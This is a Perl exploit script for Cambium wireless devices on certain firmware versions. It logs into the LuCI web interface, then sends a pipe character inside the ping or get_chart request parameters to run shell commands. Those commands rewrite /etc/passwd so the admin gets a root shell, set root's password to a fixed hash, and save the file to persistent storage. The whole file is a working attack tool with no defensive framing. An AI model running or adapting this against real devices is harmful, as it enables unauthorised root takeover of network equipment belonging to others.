#!/usr/bin/env perl

use strict;
use HTTP::Request;
use LWP::UserAgent;
use JSON;
use Data::Dumper;

my $ua = LWP::UserAgent->new();
my $data;
my $header;
my $request;
my $response;
my $out;

my $API_URL   = 'cgi-bin/luci';

my $set_admin_sh = 'sed%20-i%20%27s~/usr/bin/clish~/bin/ash~%27%20/etc/passwd%20|%20cat%20/etc/passwd';
my $set_root_pwd = 'sed%20-i%20%27s~root:.*~root:$1$sLXERzb/$VJx.bRFrbGc0JrEWKiVki1:0:0:root:/root:/bin/ash~%27%20/etc/passwd%20|%20cat%20/etc/passwd';
my $copy_pwd     = 'cp%20/etc/passwd%20/mnt/config/passwd|%20cat%20/mnt/config/passwd';

if (@ARGV<3){
    print "Enable root access on Cambium device with firmware <2.5 or 3.1-3.5\n";
    print "Usage: $0 <ip> <username> <password>\n";
    exit;
}
my $HOST_IP   = $ARGV[0];
my $HOST_USER = $ARGV[1];
my $HOST_PASS = $ARGV[2];

#login
printf("Login in '%s' with '%s':'%s'\n",$HOST_IP,$HOST_USER,$HOST_PASS);
$data = "username=$HOST_USER&password=$HOST_PASS";
$header = ['Content-Type'=>'application/x-www-form-urlencoded; charset=UTF-8'];
$request = HTTP::Request->new('POST',"http://$HOST_IP/$API_URL",
    $header,
    $data);
$response = $ua->request($request);
my $cookie = $response->{'_headers'}->{'set-cookie'};
$cookie =~ s/;.*//;
$out = decode_json($response->content);
if ($out->{'success'} == 0 && $out->{'msg'}){
    printf("Auth error: %s\n",$out->{'msg'});
    exit;
}
my $stok = $out->{'stok'};
$cookie.=";stok_80=$stok;usernameType_80=$HOST_USER";
printf("Login ok; session '%s'\n",$stok);
$header = ['Content-Type'=>'application/x-www-form-urlencoded; charset=UTF-8','Cookie'=>$cookie];

#get info
$request = HTTP::Request->new('POST',"http://$HOST_IP/$API_URL/;stok=$stok/admin/get_param",
    $header,
    "act=status&debug=0");
$response = $ua->request($request);
$out = decode_json($response->content);
my $version = $out->{'device_props'}->{'cambiumCurrentuImageVersion'};
printf("Cambium firmware version %s\n",$version);

my $exploit_cmd;
my $exploit_data;

if ($version le "2.5"){
    $exploit_cmd  = "/admin/ping";
    $exploit_data = "ping_ip=127.0.0.1";
    printf ("Use ping exploit\n");
} elsif ($version ge "3.1" && $version le "3.5"){
    $exploit_cmd  = "/admin/get_chart";
    $exploit_data = "timestamp=1111111";
    printf ("Use get_chart exploit\n");
} else {
    $exploit_cmd  = '';
    printf("Need firmware version <2.5 or 3.1-3.5\n");
}
if ($exploit_cmd){
    #do expolit
    printf("Enable admin shell...");
    $request = HTTP::Request->new('POST',"http://$HOST_IP/$API_URL/;stok=$stok$exploit_cmd",
        $header,
        $exploit_data."|$set_admin_sh");
    $response = $ua->request($request);
    if ($response->content=~/admin.*ash/){
        printf("Ok\n");
    };

    printf("Change root password to 'admin'...");
    $request = HTTP::Request->new('POST',"http://$HOST_IP/$API_URL/;stok=$stok$exploit_cmd",
        $header,
        $exploit_data."|$set_root_pwd");
    $response = $ua->request($request);
    if ($response->content=~/admin.*ash/){
        printf("Ok\n");
    };

    printf("Save passwd...");
    $request = HTTP::Request->new('POST',"http://$HOST_IP/$API_URL/;stok=$stok$exploit_cmd",
        $header,
        $exploit_data."|$copy_pwd");
    $response = $ua->request($request);
    if ($response->content=~/admin.*ash/){
        printf("Ok\n");
    };
}

#logout
$request = HTTP::Request->new('POST',"http://$HOST_IP/$API_URL/;stok=$stok/admin/logout",
    $header,
    "debug=0");
$response = $ua->request($request);
printf("Logout\n");
